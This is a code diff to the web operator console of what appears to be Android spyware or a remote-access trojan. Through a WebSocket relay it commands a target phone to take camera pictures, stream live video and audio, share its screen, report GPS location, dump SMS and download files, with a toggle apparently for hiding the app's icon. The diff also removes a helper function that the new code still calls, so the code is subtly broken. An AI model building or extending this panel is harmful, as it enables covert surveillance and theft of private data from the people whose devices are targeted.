@@ -67,6 +67,66 @@
             border-color:#1976ff;
         }
 
+        /* camera control panels */
+        .camera-panel {
+            background: #f0f2f5;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 8px 0;
+            display: none;
+        }
+        .camera-panel.show {
+            display: block;
+        }
+        .camera-option {
+            margin: 8px 0;
+        }
+        .camera-option label {
+            margin-right: 15px;
+            color: #1a2634;
+        }
+        .capture-btn, .live-btn {
+            background: #1976ff;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 8px;
+        }
+        .capture-btn:hover, .live-btn:hover {
+            background: #0d5bca;
+        }
+
+        /* live stream controls */
+        .live-controls {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+        .live-controls button {
+            flex: 1;
+            background: #1976ff;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: auto;
+        }
+        .live-controls button.stop {
+            background: #d32f2f;
+        }
+        .live-controls button.stop:hover {
+            background: #b71c1c;
+        }
+        .live-controls button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
         /* ===== MAIN PANEL ===== */
         #main{
             flex:1;
@@ -210,46 +270,75 @@
             color:#2c3e50;
             flex:1;
         }
-        .file-list-container {
+        .file-panes {
+            display: flex;
+            gap: 20px;
             flex: 1;
+            overflow: hidden;
+            min-height: 300px;
+        }
+        .folder-pane {
+            flex: 1;
+            background: #fafbfc;
+            border-radius: 8px;
+            padding: 10px;
             overflow-y: auto;
-            max-height: calc(100vh - 300px); /* adjust as needed */
+            border: 1px solid #eef2f5;
         }
-        .file-list{
-            border-top:1px solid #eef2f5;
+        .file-pane {
+            flex: 1;
+            background: #fafbfc;
+            border-radius: 8px;
+            padding: 10px;
+            overflow-y: auto;
+            border: 1px solid #eef2f5;
         }
-        .file-item{
-            display:flex;
-            align-items:center;
-            padding:8px 12px;
-            border-bottom:1px solid #eef2f5;
-            gap:8px;
+        .pane-title {
+            font-size: 12px;
+            font-weight: 600;
+            color: #7b8a9b;
+            margin-bottom: 10px;
+            text-transform: uppercase;
         }
-        .file-item:hover{
-            background:#f5f9ff;
+        .folder-item, .file-item {
+            display: flex;
+            align-items: center;
+            padding: 6px 8px;
+            border-radius: 6px;
+            cursor: pointer;
+            gap: 8px;
+            margin-bottom: 2px;
         }
-        .file-checkbox{
-            width:18px;
-            height:18px;
-            cursor:pointer;
+        .folder-item:hover {
+            background: #e3f2fd;
         }
-        .file-icon{
-            font-size:18px;
-            width:24px;
-            text-align:center;
+        .file-item {
+            cursor: default;
         }
-        .file-name{
-            flex:1;
-            color:#1a2634;
-            cursor:pointer;
+        .file-item:hover {
+            background: #f5f5f5;
         }
-        .file-name.folder:hover{
-            text-decoration:underline;
+        .folder-icon, .file-icon {
+            width: 20px;
+            text-align: center;
         }
-        .file-size{
-            color:#7b8a9b;
-            font-size:13px;
-            margin-right:15px;
+        .folder-name, .file-name {
+            flex: 1;
+            font-size: 14px;
+        }
+        .folder-name {
+            color: #1976ff;
+        }
+        .file-checkbox {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            margin-right: 8px;
+        }
+        .file-size {
+            color: #7b8a9b;
+            font-size: 12px;
+            margin-left: 10px;
         }
         .download-selected{
             margin-top:15px;
@@ -319,16 +408,36 @@
     <div class="section">
         <div class="section-title">Surveillance</div>
         <button onclick="toggleScreen()"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
-        <button onclick="toggleFrontCam()"><span>📷</span> <span id="frontCamBtn">Front Camera</span></button>
-        <button onclick="toggleBackCam()"><span>📷</span> <span id="backCamBtn">Back Camera</span></button>
+
+        <!-- Click Picture panel -->
+        <button onclick="toggleCameraPanel('click')"><span>📷</span> Click Picture</button>
+        <div id="clickCameraPanel" class="camera-panel">
+            <div class="camera-option">
+                <label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label>
+                <label><input type="radio" name="clickCameraSelect" value="back"> Rear</label>
+            </div>
+            <div class="camera-option">
+                <label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label>
+            </div>
+            <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
+        </div>
+
+        <!-- See Live panel -->
+        <button onclick="toggleCameraPanel('live')"><span>📹</span> See Live</button>
+        <div id="liveCameraPanel" class="camera-panel">
+            <div class="camera-option">
+                <label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label>
+                <label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label>
+            </div>
+            <div class="camera-option">
+                <label><input type="checkbox" id="liveFlashCheckbox"> Use flash</label>
+                <label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label>
+            </div>
+            <button class="live-btn" onclick="startLiveStream()">See Live</button>
+        </div>
+
         <button onclick="toggleMic()"><span>🎤</span> <span id="micBtn">Start Mic</span></button>
         <button onclick="send('getLocation')"><span>📍</span> GPS Location</button>
-        <button onclick="toggleLiveCam('front')"><span>📹</span> <span id="liveFrontBtn">Live Front Cam</span></button>
-        <button onclick="toggleLiveCam('back')"><span>📹</span> <span id="liveBackBtn">Live Back Cam</span></button>
-        <button onclick="stopLiveCam()" style="display:none;" id="stopLiveCamBtn">⏹ Stop Live Cam</button>
-        <button onclick="snapshot()">📸 Snapshot</button>
-        <button onclick="startRecording()">⏺ Record</button>
-        <button onclick="stopRecording()">⏹ Stop Record</button>
     </div>
 
     <div class="section">
@@ -359,18 +468,12 @@
 
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-
     // ---------- CONFIG ----------
     const WS_URL = "wss://mirror-view.onrender.com";
 
     // ---------- GLOBALS ----------
-    let liveCamPC = null;
-    let liveCamStream = null;
-    let mediaRecorder = null;
-    let recordedChunks = [];
-    let currentLiveCam = null; // 'front' or 'back'
     let ws;
-    let pc = null;                     // WebRTC peer
+    let pc = null;                     // WebRTC peer for screen share
     let mapInstance = null;
     let currentData = [];               // for pagination
     let currentPage = 0;
@@ -379,220 +482,19 @@
     let selectedFiles = [];              // paths of selected files for download
     let downloadQueue = [];              // queue of paths for which we've sent 'dl' and await FILE_DATA
 
+    // Live camera state
+    let liveCamPC = null;
+    let liveCamStream = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+
     // Toggle states
     let screenActive = false;
-    let frontCamActive = false;
-    let backCamActive = false;
     let micActive = false;
     let iconHidden = false;
 
     const panel = document.getElementById('main-panel');
-    function toggleLiveCam(camera) {
-    if (liveCamPC) {
-        stopLiveCam();
-    } else {
-        startLiveCam(camera);
-    }
-}
-// In handleJSON, add a case for CAMERA_OFFER with logging
 
-
-// Also add logging in startLiveCam:
-function startLiveCam(camera) {
-    console.log('startLiveCam', camera);
-    if (!ws || ws.readyState !== WebSocket.OPEN) {
-        alert('Not connected');
-        return;
-    }
-    currentLiveCam = camera;
-    panel.innerHTML = '<video id="liveCamVideo" autoplay playsinline></video>';
-    liveCamPC = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-    console.log('liveCamPC created');
-    liveCamPC.ontrack = (e) => {
-        console.log('ontrack', e.streams[0]);
-        liveCamStream = e.streams[0];
-        document.getElementById('liveCamVideo').srcObject = liveCamStream;
-    };
-    liveCamPC.oniceconnectionstatechange = () => {
-    console.log('ICE connection state:', liveCamPC.iceConnectionState);
-};
-    liveCamPC.onicecandidate = (e) => {
-        if (e.candidate) {
-            console.log('Sending ICE candidate', e.candidate);
-            ws.send(JSON.stringify({
-                type: 'ICE_CANDIDATE',
-                candidate: e.candidate.candidate,
-                sdpMid: e.candidate.sdpMid,
-                sdpMLineIndex: e.candidate.sdpMLineIndex
-            }));
-        }
-    };
-    // Send command to device
-    const cmd = {
-        type: 'COMMAND',
-        command: 'START_CAMERA_STREAM',
-        requestId: generateRequestId(),
-        params: { camera: camera }
-    };
-    console.log('Sending command', cmd);
-    ws.send(JSON.stringify(cmd));
-    // Update UI
-    document.getElementById('liveFrontBtn').parentElement.style.display = 'none';
-    document.getElementById('liveBackBtn').parentElement.style.display = 'none';
-    document.getElementById('stopLiveCamBtn').style.display = 'block';
-}
-
-function handleCameraOffer(msg) {
-    console.log('handleCameraOffer', msg);
-    if (!liveCamPC) {
-        console.error('No live camera peer connection');
-        return;
-    }
-    const offer = new RTCSessionDescription({ type: 'offer', sdp: msg.sdp });
-    liveCamPC.setRemoteDescription(offer)
-        .then(() => {
-            console.log('Remote description set, creating answer');
-            return liveCamPC.createAnswer();
-        })
-        .then(answer => {
-            console.log('Answer created', answer);
-            return liveCamPC.setLocalDescription(answer);
-        })
-        .then(() => {
-            console.log('Local description set, sending ANSWER');
-            ws.send(JSON.stringify({
-                type: 'ANSWER',
-                requestId: msg.requestId,
-                sdp: liveCamPC.localDescription.sdp
-            }));
-        })
-        .catch(e => console.error('Error handling camera offer:', e));
-}
-function startLiveCam(camera) {
-    if (!ws || ws.readyState !== WebSocket.OPEN) {
-        alert('Not connected');
-        return;
-    }
-    currentLiveCam = camera;
-    panel.innerHTML = '<video id="liveCamVideo" autoplay playsinline></video>';
-    liveCamPC = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-    liveCamPC.ontrack = (e) => {
-        liveCamStream = e.streams[0];
-        document.getElementById('liveCamVideo').srcObject = liveCamStream;
-    };
-    liveCamPC.onicecandidate = (e) => {
-        if (e.candidate) {
-            ws.send(JSON.stringify({
-                type: 'ICE_CANDIDATE',
-                candidate: e.candidate.candidate,
-                sdpMid: e.candidate.sdpMid,
-                sdpMLineIndex: e.candidate.sdpMLineIndex
-            }));
-        }
-    };
-    // Send command to device
-    ws.send(JSON.stringify({
-        type: 'COMMAND',
-        command: 'START_CAMERA_STREAM',
-        requestId: generateRequestId(),
-        params: { camera: camera }
-    }));
-    // Update UI
-    document.getElementById('liveFrontBtn').parentElement.style.display = 'none';
-    document.getElementById('liveBackBtn').parentElement.style.display = 'none';
-    document.getElementById('stopLiveCamBtn').style.display = 'block';
-}
-
-function stopLiveCam() {
-    if (liveCamPC) {
-        liveCamPC.close();
-        liveCamPC = null;
-        liveCamStream = null;
-    }
-    ws.send(JSON.stringify({ type: 'COMMAND', command: 'STOP_CAMERA_STREAM', requestId: generateRequestId() }));
-    document.getElementById('liveFrontBtn').parentElement.style.display = 'block';
-    document.getElementById('liveBackBtn').parentElement.style.display = 'block';
-    document.getElementById('stopLiveCamBtn').style.display = 'none';
-    panel.innerHTML = 'Ready.';
-}
-
-// Handle incoming camera offer
-function handleCameraOffer(msg) {
-    console.log('handleCameraOffer', msg);
-    console.log('SDP length:', msg.sdp ? msg.sdp.length : 0);
-    if (!liveCamPC) {
-        console.error('No live camera peer connection');
-        return;
-    }
-    const offer = new RTCSessionDescription({ type: 'offer', sdp: msg.sdp });
-    liveCamPC.setRemoteDescription(offer)
-        .then(() => {
-            console.log('Remote description set, creating answer');
-            return liveCamPC.createAnswer();
-        })
-        .then(answer => {
-            console.log('Answer created, SDP length:', answer.sdp.length);
-            return liveCamPC.setLocalDescription(answer);
-        })
-        .then(() => {
-            console.log('Local description set, sending ANSWER');
-            ws.send(JSON.stringify({
-                type: 'ANSWER',
-                requestId: msg.requestId,
-                sdp: liveCamPC.localDescription.sdp
-            }));
-        })
-        .catch(e => console.error('Error handling camera offer:', e));
-}
-
-// Snapshot from live video
-function snapshot() {
-    const video = document.getElementById('liveCamVideo');
-    if (!video) {
-        alert('No live camera active');
-        return;
-    }
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    canvas.toBlob(blob => {
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `snapshot_${Date.now()}.png`;
-        a.click();
-        URL.revokeObjectURL(url);
-    }, 'image/png');
-}
-
-// Recording (MediaRecorder)
-function startRecording() {
-    if (!liveCamStream) {
-        alert('No live camera active');
-        return;
-    }
-    recordedChunks = [];
-    mediaRecorder = new MediaRecorder(liveCamStream);
-    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
-    mediaRecorder.onstop = () => {
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `recording_${Date.now()}.webm`;
-        a.click();
-        URL.revokeObjectURL(url);
-    };
-    mediaRecorder.start();
-    alert('Recording started');
-}
-
-function stopRecording() {
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-        mediaRecorder.stop();
-    }
-}
     // ---------- CONNECTION (with dual message handling) ----------
     function connect() {
         ws = new WebSocket(WS_URL);
@@ -645,7 +547,7 @@ function stopRecording() {
                 renderMap(json.data);
                 break;
             case 'CAMERA_IMAGE':
-                showImage(json.data);
+                displayCapturedImage(json.data);
                 break;
             case 'AUDIO_RECORDING':
                 showAudio(json.data);
@@ -681,30 +583,25 @@ function stopRecording() {
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
                 showNotification('Screen share started');
                 break;
-            case 'CAMERA_OFFER':
-                console.log('📥 Received CAMERA_OFFER', msg);
-                handleCameraOffer(msg);
-                break;
             case 'SCREEN_SHARE_STOPPED':
                 screenActive = false;
                 document.getElementById('screenBtn').innerText = 'Start Screen';
                 if (pc) { pc.close(); pc = null; }
                 showNotification('Screen share stopped');
                 break;
-            case 'OFFER': // Add this case!
+            case 'OFFER':
                 console.log('📥 Received WebRTC Screen OFFER');
-                handleOffer(json.sdp); // Pass the SDP string directly to your existing handleOffer function
+                handleOffer(json.sdp);
                 break;
-            case 'AUDIO_OFFER':
-                // Handle audio WebRTC if needed
+            case 'CAMERA_OFFER':
+                console.log('📥 Received CAMERA_OFFER');
+                handleCameraOffer(json);
                 break;
             default:
                 console.log('Unhandled JSON type:', json.type);
         }
     }
-    function generateRequestId() {
-    return 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
-    }
+
     // ---------- PLAIN TEXT HANDLER (legacy) ----------
     function handlePlainText(msg) {
         if (msg.startsWith("STATUS:")) {
@@ -741,7 +638,8 @@ function stopRecording() {
                 console.error(err);
             }
         } else if (msg.startsWith("CAMERA_IMAGE:")) {
-            showImage(msg.substring(13));
+            const base64 = msg.substring(13);
+            displayCapturedImage(base64);
         } else if (msg.startsWith("AUDIO_RECORDING:")) {
             showAudio(msg.substring(16));
         } else if (msg.startsWith("AUDIO_STARTED")) {
@@ -778,52 +676,19 @@ function stopRecording() {
         } else if (msg.startsWith("ERROR:")) {
             panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
         } else if (msg.startsWith("FILE_DATA:")) {
-            // File download: base64 data follows
             const base64 = msg.substring(10);
-            // Get the next path from download queue
             if (downloadQueue.length > 0) {
                 const path = downloadQueue.shift();
-                const filename = path.split('/').pop(); // extract basename
+                const filename = path.split('/').pop();
                 downloadBase64(base64, filename);
             } else {
-                // fallback – should not happen
                 downloadBase64(base64, 'downloaded_file');
             }
         } else {
             console.log('Unhandled plain text:', msg);
         }
     }
-function handleOffer(sdp) {
-    if (!pc) {
-        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-        pc.ontrack = (e) => {
-            panel.innerHTML = '<video autoplay playsinline style="width:100%; height:100%;"></video>';
-            document.querySelector('video').srcObject = e.streams[0];
-        };
-        pc.onicecandidate = (e) => {
-            if (e.candidate) {
-                // Send ICE candidate as JSON to match Android expectations
-                ws.send(JSON.stringify({
-                    type: "ICE_CANDIDATE",
-                    candidate: e.candidate.candidate,
-                    sdpMid: e.candidate.sdpMid,
-                    sdpMLineIndex: e.candidate.sdpMLineIndex
-                }));
-            }
-        };
-    }
-    pc.setRemoteDescription({ type: 'offer', sdp })
-        .then(() => pc.createAnswer())
-        .then(a => pc.setLocalDescription(a))
-        .then(() => {
-            // Send Answer as JSON to match Android expectations
-            ws.send(JSON.stringify({
-                type: "ANSWER",
-                sdp: pc.localDescription.sdp
-            }));
-        })
-        .catch(console.error);
-}
+
     function setStatus(s) {
         const el = document.getElementById('status');
         el.innerText = s;
@@ -840,44 +705,186 @@ function handleOffer(sdp) {
         }
     }
 
+    // ---------- SEND JSON COMMAND ----------
+    function sendCommand(command, params = {}) {
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            alert('Not connected');
+            return;
+        }
+        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+        const payload = {
+            type: 'COMMAND',
+            command: command,
+            requestId: requestId,
+            params: params,
+            timestamp: Date.now()
+        };
+        ws.send(JSON.stringify(payload));
+    }
+
+    // ---------- TOGGLE CAMERA PANELS ----------
+    function toggleCameraPanel(panelId) {
+        const clickPanel = document.getElementById('clickCameraPanel');
+        const livePanel = document.getElementById('liveCameraPanel');
+        if (panelId === 'click') {
+            clickPanel.classList.toggle('show');
+            livePanel.classList.remove('show');
+        } else {
+            livePanel.classList.toggle('show');
+            clickPanel.classList.remove('show');
+        }
+    }
+
+    // ---------- CAPTURE PICTURE ----------
+    function capturePicture() {
+        const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
+        const useFlash = document.getElementById('clickFlashCheckbox').checked;
+        // Use correct command name that device expects: CAMERA_SNAPSHOT (uppercase with underscore)
+        sendCommand('CAMERA_SNAPSHOT', { camera: camera, flash: useFlash });
+    }
+
+    // ---------- DISPLAY CAPTURED IMAGE WITH SAVE BUTTON ----------
+    function displayCapturedImage(base64) {
+        panel.innerHTML = `
+            <img src="data:image/jpeg;base64,${base64}">
+            <div style="margin-top:10px;">
+                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">SAVE IMAGE</button>
+            </div>
+        `;
+    }
+
+    // ---------- LIVE STREAM ----------
+    function startLiveStream() {
+        const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
+        const useFlash = document.getElementById('liveFlashCheckbox').checked;
+        const useMic = document.getElementById('liveMicCheckbox').checked;
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            alert('Not connected');
+            return;
+        }
+
+        panel.innerHTML = `
+            <video id="liveCamVideo" autoplay playsinline></video>
+            <div class="live-controls">
+                <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
+                <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
+                <button class="stop" onclick="stopLiveStream()">Stop</button>
+            </div>
+        `;
+
+        liveCamPC = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        liveCamPC.ontrack = (e) => {
+            liveCamStream = e.streams[0];
+            document.getElementById('liveCamVideo').srcObject = liveCamStream;
+        };
+        liveCamPC.onicecandidate = (e) => {
+            if (e.candidate) {
+                ws.send(JSON.stringify({
+                    type: 'ICE_CANDIDATE',
+                    candidate: e.candidate.candidate,
+                    sdpMid: e.candidate.sdpMid,
+                    sdpMLineIndex: e.candidate.sdpMLineIndex
+                }));
+            }
+        };
+        liveCamPC.oniceconnectionstatechange = () => {
+            console.log('ICE connection state:', liveCamPC.iceConnectionState);
+        };
+
+        const cmd = {
+            type: 'COMMAND',
+            command: 'START_CAMERA_STREAM',
+            requestId: generateRequestId(),
+            params: { camera: camera, flash: useFlash, mic: useMic }
+        };
+        ws.send(JSON.stringify(cmd));
+    }
+
+    function stopLiveStream() {
+        if (liveCamPC) {
+            liveCamPC.close();
+            liveCamPC = null;
+            liveCamStream = null;
+        }
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+            mediaRecorder.stop();
+            mediaRecorder = null;
+        }
+        ws.send(JSON.stringify({ type: 'COMMAND', command: 'STOP_CAMERA_STREAM', requestId: generateRequestId() }));
+        panel.innerHTML = 'Ready.';
+    }
+
+    function handleCameraOffer(msg) {
+        if (!liveCamPC) {
+            console.error('No live camera peer connection');
+            return;
+        }
+        const offer = new RTCSessionDescription({ type: 'offer', sdp: msg.sdp });
+        liveCamPC.setRemoteDescription(offer)
+            .then(() => liveCamPC.createAnswer())
+            .then(answer => liveCamPC.setLocalDescription(answer))
+            .then(() => {
+                ws.send(JSON.stringify({
+                    type: 'ANSWER',
+                    requestId: msg.requestId,
+                    sdp: liveCamPC.localDescription.sdp
+                }));
+            })
+            .catch(e => console.error('Error handling camera offer:', e));
+    }
+
+    // Snapshot from live video
+    function takeSnapshot() {
+        const video = document.getElementById('liveCamVideo');
+        if (!video) {
+            alert('No live video');
+            return;
+        }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `snapshot_${Date.now()}.png`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }, 'image/png');
+    }
+
+    // Recording
+    function toggleRecording() {
+        if (!liveCamStream) {
+            alert('No live stream');
+            return;
+        }
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+            document.getElementById('recordBtn').innerText = 'Record Video';
+        } else {
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(liveCamStream);
+            mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `recording_${Date.now()}.webm`;
+                a.click();
+                URL.revokeObjectURL(url);
+            };
+            mediaRecorder.start();
+            document.getElementById('recordBtn').innerText = 'Stop Recording';
+        }
+    }
+
     // ---------- TOGGLES ----------
     function toggleScreen() {
         if (screenActive) send('STOP_SCREEN_SHARE');
         else send('START_SCREEN_SHARE');
-    }
-
-    function toggleFrontCam() {
-        if (frontCamActive) {
-            frontCamActive = false;
-            document.getElementById('frontCamBtn').innerText = 'Front Camera';
-        } else {
-            send('camFront');
-            frontCamActive = true;
-            document.getElementById('frontCamBtn').innerText = 'Stop Front';
-            setTimeout(() => {
-                if (frontCamActive) {
-                    frontCamActive = false;
-                    document.getElementById('frontCamBtn').innerText = 'Front Camera';
-                }
-            }, 5000);
-        }
-    }
-
-    function toggleBackCam() {
-        if (backCamActive) {
-            backCamActive = false;
-            document.getElementById('backCamBtn').innerText = 'Back Camera';
-        } else {
-            send('camBack');
-            backCamActive = true;
-            document.getElementById('backCamBtn').innerText = 'Stop Back';
-            setTimeout(() => {
-                if (backCamActive) {
-                    backCamActive = false;
-                    document.getElementById('backCamBtn').innerText = 'Back Camera';
-                }
-            }, 5000);
-        }
     }
 
     function toggleMic() {
@@ -891,14 +898,6 @@ function handleOffer(sdp) {
     }
 
     // ---------- RENDERERS ----------
-    function showImage(base64) {
-        panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
-        frontCamActive = false;
-        backCamActive = false;
-        document.getElementById('frontCamBtn').innerText = 'Front Camera';
-        document.getElementById('backCamBtn').innerText = 'Back Camera';
-    }
-
     function showAudio(base64) {
         panel.innerHTML = `
             <audio controls src="data:audio/3gp;base64,${base64}"></audio>
@@ -914,11 +913,9 @@ function handleOffer(sdp) {
     }
 
     function renderMap(loc) {
-        // Create map container with overlay
         panel.innerHTML = '<div id="map" style="position:relative;"></div>';
         const mapDiv = document.getElementById('map');
 
-        // Create info overlay
         const infoDiv = document.createElement('div');
         infoDiv.className = 'map-info';
         infoDiv.innerHTML = `
@@ -929,13 +926,11 @@ function handleOffer(sdp) {
         `;
         mapDiv.appendChild(infoDiv);
 
-        // Initialize map
         if (mapInstance) mapInstance.remove();
         mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
         L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
 
-        // Fetch human-readable address using Nominatim
         fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
             headers: { 'User-Agent': 'SystemSync-Console/1.0' }
         })
@@ -957,10 +952,7 @@ function handleOffer(sdp) {
             return;
         }
 
-        // Prepare columns based on dataType (no timestamp formatting)
-        let headers = [];
-        let rows = [];
-
+        let headers = [], rows = [];
         if (dataType === 'sms') {
             headers = ['Type', 'Number', 'Message', 'Date'];
             rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
@@ -994,7 +986,6 @@ function handleOffer(sdp) {
         });
         html += '</tbody></table>';
 
-        // Pagination
         if (totalPages > 1) {
             html += '<div class="pagination">';
             for (let i = 0; i < totalPages; i++) {
@@ -1011,59 +1002,78 @@ function handleOffer(sdp) {
         renderTable();
     }
 
-    // ---------- FILE EXPLORER with fixed toolbar ----------
+    // ---------- FILE EXPLORER (two‑pane, with toolbar always visible) ----------
     function renderFiles() {
-        if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No files found. Make sure storage permission is granted.</p>';
-            return;
-        }
-
-        // Reset selected files when new directory loads
-        selectedFiles = [];
-
+        // Always show toolbar
         let html = `
             <div class="file-manager">
                 <div class="file-toolbar-sticky">
                     <div class="file-toolbar">
                         <button onclick="navigateUp()">⬆ Up</button>
                         <span class="file-path">${currentPath}</span>
-                        <button onclick="selectAllFiles()">Select All</button>
-                        <button onclick="deselectAllFiles()">Deselect All</button>
                     </div>
                 </div>
-                <div class="file-list-container">
-                    <div class="file-list">
         `;
 
-        currentData.forEach(f => {
-            const isFolder = f.isDir;
-            const path = f.path;
-            const name = f.name;
-            const size = isFolder ? '' : formatBytes(f.size);
-            const checkbox = isFolder ? '' : `<input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">`;
-            const nameDisplay = isFolder
-                ? `<span class="file-name folder" onclick="handleFolderClick('${path}')">${name}</span>`
-                : `<span class="file-name">${name}</span>`;
+        if (!currentData || currentData.length === 0) {
+            html += '<p style="padding:20px;">No files found.</p>';
+        } else {
+            // Separate folders and files
+            const folders = currentData.filter(item => item.isDir);
+            const files = currentData.filter(item => !item.isDir);
+
+            // Reset selected files only when there are files
+            selectedFiles = [];
 
             html += `
-                <div class="file-item">
-                    ${checkbox}
-                    <span class="file-icon">${isFolder ? '📁' : '📄'}</span>
-                    ${nameDisplay}
-                    <span class="file-size">${size}</span>
-                </div>
+                <div class="file-panes">
+                    <div class="folder-pane">
+                        <div class="pane-title">Folders</div>
+                        <div id="folderList">
             `;
-        });
 
-        html += `
+            folders.forEach(f => {
+                html += `
+                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
+                        <span class="folder-icon">📁</span>
+                        <span class="folder-name">${f.name}</span>
+                    </div>
+                `;
+            });
+
+            html += `
+                        </div>
+                    </div>
+                    <div class="file-pane">
+                        <div class="pane-title">Files</div>
+                        <div id="fileList">
+            `;
+
+            files.forEach(f => {
+                const path = f.path;
+                const name = f.name;
+                const size = formatBytes(f.size);
+                html += `
+                    <div class="file-item">
+                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
+                        <span class="file-icon">📄</span>
+                        <span class="file-name">${name}</span>
+                        <span class="file-size">${size}</span>
+                    </div>
+                `;
+            });
+
+            html += `
+                        </div>
                     </div>
                 </div>
                 <div class="download-selected">
                     <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
                 </div>
-            </div>
-        `;
+            `;
+        }
 
+        html += '</div>'; // close file-manager
         panel.innerHTML = html;
     }
 
@@ -1101,23 +1111,6 @@ function handleOffer(sdp) {
         }
     };
 
-    // Select all files (only files, not folders)
-    function selectAllFiles() {
-        const checkboxes = document.querySelectorAll('.file-checkbox');
-        checkboxes.forEach(cb => {
-            cb.checked = true;
-            updateSelected(cb);
-        });
-    }
-
-    function deselectAllFiles() {
-        const checkboxes = document.querySelectorAll('.file-checkbox');
-        checkboxes.forEach(cb => {
-            cb.checked = false;
-            updateSelected(cb);
-        });
-    }
-
     // Download selected files
     function downloadSelected() {
         if (selectedFiles.length === 0) {
@@ -1128,8 +1121,6 @@ function handleOffer(sdp) {
             downloadQueue.push(path);
             send('dl ' + path);
         });
-        // Optionally clear selection after download
-        // deselectAllFiles();
     }
 
     function formatBytes(b) {
@@ -1139,22 +1130,34 @@ function handleOffer(sdp) {
         return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
     }
 
-    // ---------- WEBRTC ----------
+    // ---------- SCREEN SHARE WEBRTC ----------
     function handleOffer(sdp) {
         if (!pc) {
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
             pc.ontrack = (e) => {
-                panel.innerHTML = '<video autoplay playsinline></video>';
+                panel.innerHTML = '<video autoplay playsinline style="width:100%; height:100%;"></video>';
                 document.querySelector('video').srcObject = e.streams[0];
             };
             pc.onicecandidate = (e) => {
-                if (e.candidate) ws.send('ICE_CANDIDATE:' + JSON.stringify(e.candidate));
+                if (e.candidate) {
+                    ws.send(JSON.stringify({
+                        type: "ICE_CANDIDATE",
+                        candidate: e.candidate.candidate,
+                        sdpMid: e.candidate.sdpMid,
+                        sdpMLineIndex: e.candidate.sdpMLineIndex
+                    }));
+                }
             };
         }
         pc.setRemoteDescription({ type: 'offer', sdp })
             .then(() => pc.createAnswer())
             .then(a => pc.setLocalDescription(a))
-            .then(() => ws.send('ANSWER:' + pc.localDescription.sdp))
+            .then(() => {
+                ws.send(JSON.stringify({
+                    type: "ANSWER",
+                    sdp: pc.localDescription.sdp
+                }));
+            })
             .catch(console.error);
     }
 
@@ -1163,6 +1166,10 @@ function handleOffer(sdp) {
         try {
